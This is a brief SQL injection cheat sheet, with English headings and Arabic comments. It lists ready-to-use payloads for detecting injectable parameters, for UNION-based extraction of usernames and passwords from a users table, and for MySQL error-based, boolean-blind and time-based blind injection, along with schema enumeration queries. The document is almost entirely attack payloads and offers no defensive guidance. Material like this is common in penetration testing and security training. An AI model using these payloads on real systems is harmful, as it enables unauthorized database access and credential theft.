# SQL Injection Fundamentals

## اكتشاف يدوي
```text
id=1'                      -> خطأ في الاستعلام؟
id=1' OR '1'='1
id=1' AND '1'='2
id=1 ORDER BY 3--  -       # لمعرفة عدد الأعمدة
```

## Union-based
```sql
' UNION SELECT NULL,NULL,NULL--  -
' UNION SELECT username,password,NULL FROM users--  -
```

## Error-based (MySQL)
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))--  -
```

## Blind (Boolean)
```sql
' AND 1=1--  -    (صح)
' AND 1=2--  -    (غلط -> فرق في الرد)
```

## Blind (Time-based)
```sql
' AND SLEEP(5)--  -
```

## معلومات مفيدة
```sql
SELECT @@version;
SELECT database();
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
```
